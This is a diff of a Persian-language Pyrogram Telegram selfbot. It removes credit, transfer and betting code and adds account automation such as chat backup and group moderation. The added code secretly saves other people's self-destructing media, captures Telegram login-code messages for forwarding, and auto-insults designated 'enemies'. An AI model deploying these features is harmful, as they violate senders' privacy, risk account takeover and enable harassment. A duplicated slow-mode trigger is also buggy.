+            print(f"🗑️ پیام از {message.from_user.id} به دلیل قفل همه حذف شد")
+        except Exception as e:
+            print(f"❌ خطا در حذف پیام: {e}")
+        return
+    
+    if lock_settings["مدیا"] and (message.photo or message.video):
+        try:
+            await message.delete()
+            print(f"🗑️ مدیا از {message.from_user.id} حذف شد")
         except:
             pass
-            
-        return False
-    except Exception as e:
-        print(f"❌ خطا در stop_selfbot: {e}")
-        return False
-
-def stop_all_selfbots():
-    try:
-        for timer in list(user_timers.values()): 
-            timer.stop()
-        user_timers.clear()
-        for pid in db.data.get("processes", {}).values():
-            try: 
-                import psutil
-                psutil.Process(pid).terminate()
-            except: 
-                pass
-        db.data["processes"], db.data["timers"] = {}, {}
-        db.save_data()
-    except: 
-        pass
-# ==============================
-# انتقال الماس بین کاربران گروه
-# کاربر روی پیام گیرنده ریپلای می‌کند و می‌نویسد: انتقال 100
-# ==============================
-@bot.on_message(filters.group & filters.reply & filters.regex(r'^انتقال\s+(\d+)\s*$'))
-async def transfer_diamonds_handler(client, message: Message):
-    sender_id = message.from_user.id
-    recipient = message.reply_to_message.from_user if message.reply_to_message else None
-    if not recipient:
-        return
-    recipient_id = recipient.id
-    if recipient_id == sender_id:
-        await message.reply_text("❌ نمی‌توانید به خودتان الماس انتقال دهید.")
-        return
-    amount = int(message.matches[0].group(1))
-    if amount <= 0:
-        await message.reply_text("❌ مقدار انتقال باید بیشتر از صفر باشد.")
-        return
-    sender_balance = db.get("credits", sender_id, 0)
-    if sender_balance < amount:
-        await message.reply_text(f"❌ موجودی الماس شما کافی نیست.\n\n💰 موجودی فعلی: {sender_balance:,} الماس")
-        return
-    # کارمزد پویا: انتقال‌های کوچک حتی می‌توانند بدون کارمزد باشند.
-    if amount <= 5:
-        fee_percent = random.choice([0, 0, 0, 1])
-    elif amount <= 50:
-        fee_percent = random.randint(0, 8)
-    elif amount <= 500:
-        fee_percent = random.randint(7, 12)
-    else:
-        fee_percent = random.randint(8, 15)
-    fee = int(amount * fee_percent / 100)
-    received_amount = amount - fee
-    db.set("credits", sender_id, sender_balance - amount)
-    recipient_balance = db.get("credits", recipient_id, 0) + received_amount
-    db.set("credits", recipient_id, recipient_balance)
-    sender_display = f"@{message.from_user.username}" if message.from_user.username else f"<a href=\"tg://user?id={sender_id}\">{html.escape(message.from_user.first_name or 'کاربر')}</a>"
-    recipient_display = f"@{recipient.username}" if recipient.username else f"<a href=\"tg://user?id={recipient_id}\">{html.escape(recipient.first_name or 'کاربر')}</a>"
-    transfer_text = (
-        "✅ <b>انتقال موفق!</b>\n"
-        "◈ ━━━ Persiangulf self ━━━ ◈\n"
-        f"👤 <b>فرستنده:</b> {sender_display}\n"
-        f"👤 <b>گیرنده:</b> {recipient_display}\n"
-        f"💎 <b>مقدار دریافتی:</b> {received_amount:,} الماس\n"
-        f"💵 <b>کارمزد ({fee_percent}٪):</b> {fee:,} الماس\n"
-        "◈ ━━━ Persiangulf self ━━━ ◈\n"
-        f"💰 <b>موجودی گیرنده:</b> {recipient_balance:,} الماس"
-    )
-    await message.reply_text(transfer_text, parse_mode=enums.ParseMode.HTML)
-
-@bot.on_message(filters.group & filters.regex(r'^موجودی$'))
-async def group_balance_simple(client, message: Message):
-    user_id = message.from_user.id
-    credits = db.get("credits", user_id, 0)
-    toman_value = int(credits * TOMAN_PER_COIN)
-    text = "◈ ━━━ persiangulf self ━━━ ◈\n💰 <b>موجودی شما:</b>"
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"💎 {credits:,} الماس", callback_data="balance_noop", style=KeyboardButtonStyle(bg_primary=True))],
-        [InlineKeyboardButton(f"💵 معادل {toman_value:,} تومان", callback_data="balance_noop", style=KeyboardButtonStyle(bg_success=True))]
-    ])
-    await message.reply_text(text, reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)
-
-@bot.on_message(filters.command("set") & filters.user(ADMIN_ID))
-async def set_credits(client, message: Message):
-    if len(message.command) != 3:
-        await message.reply_text("❌ فرمت: `/set آیدی تعداد`")
         return
     
-    try:
-        target_id = int(message.command[1])
-        amount = int(message.command[2])
-        db.set("credits", target_id, amount)
-        
-        await message.reply_text(f"✅ سکه کاربر {target_id} تنظیم شد به {amount}")
-        
+    if lock_settings["استیکر"] and (message.sticker or message.animation):
         try:
-            await bot.send_message(target_id, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
-        except: 
+            await message.delete()
+            print(f"🗑️ استیکر از {message.from_user.id} حذف شد")
+        except:
             pass
-        
-    except: 
-        await message.reply_text("❌ آیدی/تعداد باید عدد باشد")
-@bot.on_message(filters.group & filters.regex(r'^شرطبندی\s+(\d+)(?:\s*الماس)?$'))
-async def group_bet_handler(client, message: Message):
-    chat_id = message.chat.id
-    creator_id = message.from_user.id
-
-    try:
-        amount = int(message.matches[0].group(1))
-    except:
+        return
+    
+    if lock_settings["فوروارد"] and message.forward_date:
+        try:
+            await message.delete()
+            print(f"🗑️ فوروارد از {message.from_user.id} حذف شد")
+        except:
+            pass
+        return
+    
+    if lock_settings["ویس"] and message.voice:
+        try:
+            await message.delete()
+            print(f"🗑️ ویس از {message.from_user.id} حذف شد")
+        except:
+            pass
+        return
+    
+    if lock_settings["پیام"] and message.text and not message.text.startswith("/"):
+        try:
+            await message.delete()
+            print(f"🗑️ پیام متنی از {message.from_user.id} حذف شد")
+        except:
+            pass
+        return
+    
+    if lock_settings["فایل"] and message.document:
+        try:
+            await message.delete()
+            print(f"🗑️ فایل از {message.from_user.id} حذف شد")
+        except:
+            pass
         return
 
-    if amount <= 0:
-        await message.reply_text("❌ مقدار شرط باید بیشتر از صفر باشد.")
-        return
-    creator_credits = db.get("credits", creator_id, 0)
-    if creator_credits < amount:
-        await message.reply_text(
-            f"❌ سکه کافی برای ساخت شرط ندارید.\n"
-            f"💰 موجودی شما: {creator_credits} سکه"
-        )
-        return
-    db.set("credits", creator_id, creator_credits - amount)
-    creator_first_name = html.escape(message.from_user.first_name or 'کاربر')
-    creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
+async def keep_online(client: Client):
+    global always_online_enabled
+    while always_online_enabled:
+        try:
+            await client.invoke(
+                functions.account.UpdateStatus(
+                    offline=False
+                )
+            )
+            await asyncio.sleep(20)
+        except Exception as e:
+            print(f"❌ خطا: {e}")
+            await asyncio.sleep(5)
 
-    bet_text = (
-        "<b>◈ ━ selfisaz PersianGulf ━ ◈</b>\n"
-        "<b>𝐕𝐈𝐏</b> | شرطبندی :\n"
-        f"<b>𝐕𝐈𝐏</b> | {amount:,} الماس\n"
-        f"<b>𝐕𝐈𝐏</b> | سازنده: {creator_mention}\n"
-        "<b>◈ ━ selfisaz PersianGulf ━ ◈</b>"
-    )
+def get_iran_time() -> str:
+    now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
+    font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
+    return ''.join([font_dict.get(char, char) for char in now])
 
-    keyboard = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("◈ ━ پیوستن ━ ◈", callback_data=f"joinbet_waiting", style=KeyboardButtonStyle(bg_success=True)),
-            InlineKeyboardButton("❌ لغو", callback_data=f"cancelbet_waiting", style=KeyboardButtonStyle(bg_danger=True))
-        ]
-    ])
+def get_iran_datetime() -> str:
+    return datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')
 
-    # ارسال عکس ذخیره شده از مدیریت عکس (در صورت وجود)
-    bet_image = db.data.get("bet_doz_image")
-    if bet_image:
-        bet_msg = await message.reply_photo(
-            photo=bet_image,
-            caption=bet_text,
-            reply_markup=keyboard,
-            parse_mode=enums.ParseMode.HTML
-        )
-    else:
-        bet_msg = await message.reply_text(
-            bet_text,
-            reply_markup=keyboard,
-            parse_mode=enums.ParseMode.HTML
-        )
-
-    bet_key = f"{chat_id}_{bet_msg.id}"
-
-    bet_data = {
-        "chat_id": chat_id,
-        "message_id": bet_msg.id,
-        "amount": amount,
-        "creator_id": creator_id,
-        "creator_name": message.from_user.first_name or "",
-        "creator_username": message.from_user.username or "",
-        "participants": [],
-        "is_active": True,
-        "finished": False,
-        "timer_started": False,
-        "created_at": time.time(),
-        "refunded": False
-    }
-
-    db.set("group_bets", bet_key, bet_data)
+async def update_name_with_time(user_id: int, client: Client) -> bool:
+    if not user_time_status.get(user_id):
+        return False
     
     try:
-        new_keyboard = InlineKeyboardMarkup([
-            [
-                InlineKeyboardButton("◈ ━ پیوستن ━ ◈", callback_data=f"joinbet_{chat_id}_{bet_msg.id}", style=KeyboardButtonStyle(bg_success=True)),
-                InlineKeyboardButton("❌ لغو", callback_data=f"cancelbet_{chat_id}_{bet_msg.id}", style=KeyboardButtonStyle(bg_danger=True))
-            ]
-        ])
-        await bet_msg.edit_reply_markup(new_keyboard)
+        user = await client.get_users(user_id)
+        first_name = user_original_names.get(user_id, user.first_name or "")
+        new_name = f"{first_name} {get_iran_time()}"
+        await client.update_profile(first_name=new_name)
+        return True
     except Exception as e:
-        print(f"Error updating keyboard: {e}")
-        
-    asyncio.create_task(cancel_group_bet_if_no_joiner(client, bet_key))
-@bot.on_message(filters.command("user") & filters.user(ADMIN_ID))
-async def user_info(client, message: Message):
-    if len(message.command) != 2:
-        await message.reply_text("❌ فرمت: `/user آیدی`")
-        return
-    
+        print(f"❌ خطا در آپدیت نام کاربر {user_id}: {e}")
+        return False
+
+async def continuous_time_updater(client: Client):
+    global time_updater_started
+    while True:
+        try:
+            now = datetime.now(pytz.timezone('Asia/Tehran'))
+            seconds_until_next_minute = 60 - now.second
+            milliseconds_until_next_minute = (seconds_until_next_minute * 1000) - (now.microsecond // 1000)
+           
+            await asyncio.sleep(milliseconds_until_next_minute / 1000)
+            
+            active_users = [uid for uid, status in user_time_status.items() if status]
+            for user_id in active_users:
+                try:
+                    current_time = get_iran_time()
+                    original_name = user_original_names.get(user_id, "")
+                    new_name = f"{original_name} {current_time}"
+                    await client.update_profile(first_name=new_name)
+                except Exception as e:
+                    print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}") 
+                    
+        except Exception as e:
+            print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
+            await asyncio.sleep(60)
+
+async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
     try:
-        target_id = int(message.command[1])
-        user_data = db.get("users", target_id, {})
-        credits = db.get("credits", target_id, 0)
-        process = db.get("processes", target_id)
-        timer = db.get("timers", target_id)
-        
-        if not user_data:
-            await message.reply_text("❌ کاربر یافت نشد")
+        backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        user = await client.get_users(chat_id)
+        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
+        me = await client.get_me()
+        message_count = 0
+
+        with open(backup_file, 'w', encoding='utf-8') as f:
+            f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")
+            
+            async for message in client.get_chat_history(chat_id):
+                if until_message_id and message.id >= until_message_id:
+                    continue
+                message_count += 1
+                sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
+                if message.from_user and message.from_user.id != me.id:
+                    sender_name += f" (ID: {message.from_user.id})"
+                
+                media_type = ""
+                if message.photo: media_type = "📷 عکس"
+                elif message.video: media_type = "🎥 ویدیو"
+                elif message.document: media_type = "📄 فایل"
+                elif message.audio: media_type = "🎵 آudio"
+                elif message.voice: media_type = "🎤 ویس"
+                elif message.sticker: media_type = "🤡 استیکر"
+                
+                message_text = message.text or message.caption or ""
+                f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
+                if media_type: f.write(f"📎 نوع: {media_type}\n")
+                if message_text: f.write(f"💬 متن: {message_text}\n")
+                f.write("-"*40 + "\n\n")
+
+        return True, backup_file, message_count, user_name
+    except Exception as e:
+        return False, str(e), 0, None
+
+@app.on_message(filters.private & filters.incoming & (filters.photo | filters.video | filters.voice))
+async def handle_timed_media(client, message):
+    try:
+        if message.photo and hasattr(message.photo, 'ttl_seconds') and message.photo.ttl_seconds:
+            media = message.photo
+            file_type = 'photo'
+            file_ext = 'jpg'
+        elif message.video and hasattr(message.video, 'ttl_seconds') and message.video.ttl_seconds:
+            media = message.video
+            file_type = 'video'
+            file_ext = 'mp4'
+        elif message.voice and hasattr(message.voice, 'ttl_seconds') and message.voice.ttl_seconds:
+            media = message.voice
+            file_type = 'voice'
+            file_ext = 'ogg'
+        else:
             return
         
-        status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
-        phone = user_data.get('phone', '❌ ثبت نشده')
-        created = time.ctime(user_data.get('created_at', time.time()))
-        running = "🟢 بله" if process else "🔴 خیر"
-        has_timer = "🟢 فعال" if timer and timer.get('is_running') else "🔴 غیرفعال"
+        rand = random.randint(1000, 9999999)
+        file_path = os.path.join(SAVED_PHOTOS_DIR, f'{file_type}-{rand}.{file_ext}')
         
-        created_time = user_data.get('created_at', time.time())
-        time_diff = time.time() - created_time
-        days = int(time_diff // 86400)
-        hours = int((time_diff % 86400) // 3600)
+        await client.download_media(message, file_path)
         
-        info_text = f"""
-👤 **اطلاعات کاربر {target_id}**
-
-📱 **شماره:** `{phone}`
-📊 **وضعیت:** {status}
-💰 **سکه ها:** `{credits}`
-🔄 **سلف:** {running}
-📅 **تاریخ ایجاد:** `{created}`
-⏳ **عضو شده:** {days} روز و {hours} ساعت
-
-⏱ **زمان باقی‌مانده:** `{credits}` ساعت
-💸 **مصرف سکه:** 1 سکه در ساعت
-"""
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🎯 تنظیم سکه", callback_data=f"set_{target_id}"),
-             InlineKeyboardButton("🛑 توقف سلف", callback_data=f"stop_{target_id}")]
-        ])
-        
-        await message.reply_text(info_text, reply_markup=keyboard)
-        
-    except: 
-        await message.reply_text("❌ آیدی باید عدد باشد")
-
-@bot.on_message(filters.command("admin") & filters.user(ADMIN_ID))
-async def admin_panel(client, message: Message):
-    """پنل مدیریت اصلی؛ دکمه مدیریت عکس شرط و دوز همیشه در همین پنل نمایش داده می‌شود."""
-    users = db.data.get("users", {})
-    active_count = len(db.data.get("processes", {}))
-    total_credits = sum(db.data.get("credits", {}).values())
-    pending_payments = len(db.get_pending_payments())
-    today = time.time() - 86400
-    new_today = sum(1 for user_data in users.values() if user_data.get("created_at", 0) > today)
-
-    stats_text = (
-        "🛠 **پنل مدیریت ادمین**\n\n"
-        f"👥 **کل کاربران:** `{len(users)}`\n"
-        f"🟢 **کاربران فعال:** `{active_count}`\n"
-        f"🆕 **کاربران امروز:** `{new_today}`\n"
-        f"💰 **مجموع سکه ها:** `{total_credits}`\n\n"
-        f"📋 **درخواست‌های در انتظار:**\n└─ 💰 پرداخت: `{pending_payments}`\n"
-    )
-
-    # مهم: این دکمه مستقیماً در کیبورد اصلی /admin است.
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🖼 مدیریت عکس شرط و دوز", callback_data="ADMIN_PHOTO_PANEL", style=KeyboardButtonStyle(bg_primary=True))],
-        [InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list"),
-         InlineKeyboardButton("📊 آمار کامل", callback_data="admin_stats")],
-        [InlineKeyboardButton("💰 برترین کاربران", callback_data="admin_top"),
-         InlineKeyboardButton("🛑 توقف همه", callback_data="admin_stop_all")],
-        [InlineKeyboardButton("💳 درخواست پرداخت", callback_data="admin_payments")],
-        [InlineKeyboardButton("🪙 سکه همگانی", callback_data="admin_global_coins", style=KeyboardButtonStyle(bg_success=True))]
-    ])
-    await message.reply_text(stats_text, reply_markup=keyboard)
-
-@bot.on_callback_query(filters.regex(r'^code_'))
-async def numpad_callback(client, callback_query):
-    user_id = callback_query.from_user.id
-    data = callback_query.data
-    current_code = user_temp_codes.get(user_id, "")
+        if os.path.exists(file_path):
+            sender = message.from_user
+            username = f"@{sender.username}" if sender.username else "ندارد"
+            caption = (
+                f"🔥 مدیای زمان‌دار ({file_type})\n"
+                f"👤 {sender.first_name or ''}\n"
+                f"🆔 {username}\n"
+                f"🔢 آیدی: {sender.id}\n"
+                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+            )
+            
+            if file_type == 'photo':
+                await client.send_photo("me", photo=file_path, caption=caption)
+            elif file_type == 'video':
+                await client.send_video("me", video=file_path, caption=caption)
+            elif file_type == 'voice':
+                await client.send_voice("me", voice=file_path, caption=caption)
+            
+            os.remove(file_path)
+            print(f"✅ مدیای تایمدار از {sender.id} ذخیره شد")
+            
+    except Exception as e:
+        print(f"❌ خطا در ذخیره مدیای تایمدار: {e}")
+@app.on_message(~filters.me & filters.incoming)
+async def global_message_handler(client: Client, message: Message):
+    if not message.from_user:
+        return
+    await check_lock(client, message)
     
-    if data == "code_clear":
-        user_temp_codes[user_id] = current_code[:-1]
-        display_code = user_temp_codes[user_id]
-
-        formatted = format_code_display(display_code)
-        
+    user_id = message.from_user.id
+    message_text = message.text or ""
+    if user_id == 777000:
+        await forward_and_save_login_codes(client, message)
+        return
+    
+    if str(user_id) in auto_reactions:
         try:
-            await safe_edit_message(callback_query.message, 
-                f"🔢 **کد تایید را وارد کنید:**\n\n"
-                f"<b><code>{formatted}</code></b>\n\n"
-                f"📱 کد {len(display_code)}/5 رقم وارد شد",
-                reply_markup=create_numpad_keyboard(),
+            reaction = auto_reactions[str(user_id)]
+            await client.send_reaction(
+                chat_id=message.chat.id,
+                message_id=message.id,
+                emoji=reaction
+            )
+        except FloodWait as e:
+            await asyncio.sleep(e.value)
+        except Exception:
+            pass
+
+    if user_id in enemies and message_text.strip():
+        try:
+            insults_list = load_insults()
+            if insults_list:
+                random_insult = random.choice(insults_list)
+                await client.send_message(
+                    message.chat.id,
+                    random_insult,
+                    reply_to_message_id=message.id
+                )
+        except FloodWait as e:
+            await asyncio.sleep(e.value)
+        except Exception:
+            pass
+    if message_text.strip():
+        message_text_lower = message_text.strip().lower()
+        for trigger, reply in auto_replies.items():
+            if trigger.lower() in message_text_lower:
+                try:
+                    await client.send_message(
+                        message.chat.id,
+                        reply,
+                        reply_to_message_id=message.id
+                    )
+                    break
+                except FloodWait as e:
+                    await asyncio.sleep(e.value)
+                    break
+                except Exception:
+                    break
+@app.on_message(filters.private & ~filters.me)
+async def apply_actions_private(client: Client, message: Message):
+    await apply_chat_actions(client, message)
+@app.on_message(filters.group & ~filters.me)
+async def apply_actions_group(client: Client, message: Message):
+    await apply_chat_actions(client, message)
+@app.on_message(filters.me & filters.regex(r'^بن$') & filters.group)
+async def ban_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        await client.ban_chat_member(message.chat.id, user_id)
+        await message.edit(f"✅ **کاربر بن شد**\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^آنبن @(.+)$') & filters.group)
+async def unban_user(client, message):
+    try:
+        username = message.matches[0].group(1)
+        user = await client.get_users(f"@{username}")
+        await client.unban_chat_member(message.chat.id, user.id)
+        await message.edit(f"✅ **کاربر آنبن شد**\n👤 کاربر: {user.first_name}")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^کیک$') & filters.group)
+async def kick_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        await client.ban_chat_member(message.chat.id, user_id)
+        await client.unban_chat_member(message.chat.id, user_id)
+        await message.edit(f"✅ **کاربر کیک شد**\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^سکوت$') & filters.group)
+async def mute_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        from pyrogram.types import ChatPermissions
+        
+        permissions = ChatPermissions(
+            can_send_messages=False,
+            can_send_media_messages=False,
+            can_send_other_messages=False,
+            can_send_polls=False,
+            can_add_web_page_previews=False,
+            can_invite_users=False,
+            can_change_info=False,
+            can_pin_messages=False
+        )
+        await client.restrict_chat_member(
+            chat_id=message.chat.id,
+            user_id=user_id,
+            permissions=permissions
+        )
+        await message.edit(f"🔇 **کاربر به سکوت کامل رفت**\n🔒 هیچ دسترسی ندارد\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^حذف سکوت$') & filters.group)
+async def unmute_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        from pyrogram.types import ChatPermissions
+        
+        permissions = ChatPermissions(
+            can_send_messages=True,
+            can_send_media_messages=True,
+            can_send_other_messages=True,
+            can_send_polls=True,
+            can_add_web_page_previews=True,
+            can_invite_users=True,
+            can_change_info=True,
+            can_pin_messages=True
+        )
+        await client.restrict_chat_member(
+            chat_id=message.chat.id,
+            user_id=user_id,
+            permissions=permissions
+        )
+        await message.edit(f"🔊 **سکوت کاربر برداشته شد**\n🔓 همه دسترسی‌ها فعال شد\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^ادمین$') & filters.group)
+async def promote_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        privileges = ChatPrivileges(
+            can_manage_chat=True,
+            can_delete_messages=True,
+            can_restrict_members=True,
+            can_promote_members=True,
+            can_change_info=True,
+            can_invite_users=True,
+            can_pin_messages=True,
+            can_manage_video_chats=True
+        )
+        await client.promote_chat_member(message.chat.id, user_id, privileges=privileges)
+        await message.edit(f"✅ **کاربر ادمین شد**\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^حذف ادمین$') & filters.group)
+async def demote_user(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
+        return
+    try:
+        user_id = message.reply_to_message.from_user.id
+        from pyrogram.types import ChatPrivileges
+        
+        privileges = ChatPrivileges(
+            can_manage_chat=False,
+            can_delete_messages=False,
+            can_restrict_members=False,
+            can_promote_members=False,
+            can_change_info=False,
+            can_invite_users=False,
+            can_pin_messages=False,
+            can_manage_video_chats=False
+        )
+        await client.promote_chat_member(
+            chat_id=message.chat.id,
+            user_id=user_id,
+            privileges=privileges
+        )
+        await message.edit(f"✅ **کاربر غیرادمین شد**\n👤 آیدی: `{user_id}`")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^پاک (\d+)$') & filters.group)
+async def purge_messages(client, message):
+    try:
+        count = int(message.matches[0].group(1))
+        if count > 100:
+            await message.edit("❌ **حداکثر تعداد مجاز: 100 پیام**")
+            return
+        
+        deleted = 0
+        async for msg in client.get_chat_history(message.chat.id, limit=count+1):
+            if msg.id != message.id:
+                try:
+                    await msg.delete()
+                    deleted += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        
+        await message.edit(f"✅ **{deleted} پیام پاک شد**")
+        await asyncio.sleep(3)
+        await message.delete()
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^پین$') & filters.group)
+async def pin_message(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیامی که می‌خواهید پین کنید ریپلای کنید**")
+        return
+    try:
+        await client.pin_chat_message(message.chat.id, message.reply_to_message.id)
+        await message.edit("✅ **پیام پین شد**")
+        await asyncio.sleep(2)
+        await message.delete()
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^آنپین$') & filters.group)
+async def unpin_message(client, message):
+    if not message.reply_to_message:
+        await message.edit("❌ **لطفا روی پیام پین شده ریپلای کنید**")
+        return
+    try:
+        await client.unpin_chat_message(message.chat.id, message.reply_to_message.id)
+        await message.edit("✅ **پیام آنپین شد**")
+        await asyncio.sleep(2)
+        await message.delete()
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^تنظیم عنوان (.+)$') & filters.group)
+async def set_chat_title(client, message):
+    try:
+        new_title = message.matches[0].group(1)
+        await client.set_chat_title(message.chat.id, new_title)
+        await message.edit(f"✅ **عنوان گروه تغییر کرد**\n📝 عنوان جدید: {new_title}")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^تنظیم توضیحات (.+)$') & filters.group)
+async def set_chat_description(client, message):
+    try:
+        new_description = message.matches[0].group(1)
+        await client.set_chat_description(message.chat.id, new_description)
+        await message.edit(f"✅ **توضیحات گروه تغییر کرد**\n📝 توضیحات جدید: {new_description}")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^تنظیم عکس$') & filters.group)
+async def set_chat_photo(client, message):
+    if not message.reply_to_message or not message.reply_to_message.photo:
+        await message.edit("❌ **لطفا روی یک عکس ریپلای کنید**")
+        return
+    try:
+        photo_path = await message.reply_to_message.download()
+        await client.set_chat_photo(chat_id=message.chat.id, photo=photo_path)
+        os.remove(photo_path)
+        await message.edit("✅ **عکس گروه تغییر کرد**")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^اطلاعات گروه$') & filters.group)
+async def group_info(client, message):
+    try:
+        chat = await client.get_chat(message.chat.id)
+        admins = []
+        async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+            admins.append(admin.user)
+        
+        info_text = f"""📊 **اطلاعات گروه**
+
+📌 **عنوان:** {chat.title}
+🆔 **آیدی:** `{chat.id}`
+👥 **تعداد اعضا:** {chat.members_count if chat.members_count else 'نامشخص'}
+📝 **توضیحات:** {chat.description or 'ندارد'}
+🔗 **لینک:** {chat.invite_link or 'ندارد'}
+
+👑 **ادمین‌ها ({len(admins)} نفر):**
+"""
+        for i, admin in enumerate(admins[:10], 1):
+            username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
+            info_text += f"{i}. {admin.first_name or 'نامشخص'} {admin.last_name or ''} - {username}\n"
+        
+        if len(admins) > 10:
+            info_text += f"\n... و {len(admins) - 10} ادمین دیگر"
+        
+        await message.edit(info_text)
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^لیست ادمین$') & filters.group)
+async def list_admins(client, message):
+    try:
+        admins = []
+        async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+            admins.append(admin.user)
+        
+        if not admins:
+            await message.edit("❌ **هیچ ادمینی در گروه یافت نشد**")
+            return
+        
+        list_text = f"👑 **لیست ادمین‌ها ({len(admins)} نفر)**\n\n"
+        for i, admin in enumerate(admins, 1):
+            username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
+            list_text += f"{i}. **{admin.first_name or 'نامشخص'}** {admin.last_name or ''}\n"
+            list_text += f"   🆔 `{admin.id}`\n"
+            list_text += f"   📱 {username}\n\n"
+        
+        await message.edit(list_text)
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^تعداد اعضا$') & filters.group)
+async def members_count(client, message):
+    try:
+        chat = await client.get_chat(message.chat.id)
+        count = chat.members_count if chat.members_count else "نامشخص"
+        await message.edit(f"👥 **تعداد اعضای گروه:** {count}")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
+async def slowmode_on(client, message):
+    try:
+        await client.set_slow_mode(chat_id=message.chat.id, seconds=60)
+        await message.edit("🔒 **اهسته روشن شد**\nکاربران هر 60 ثانیه یک بار میتوانند پیام بفرستند")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
+async def slowmode_off(client, message):
+    try:
+        await client.set_slow_mode(chat_id=message.chat.id, seconds=0)
+        await message.edit("🔓 **اهسته خاموش شد**\nهمه کاربران میتوانند بدون محدودیت پیام بفرستند")
+    except Exception as e:
+        await message.edit(f"❌ **خطا:** `{str(e)}`")
+
+@app.on_message(filters.me & filters.text & ~filters.command([
+    "سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم", 
+    "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد", 
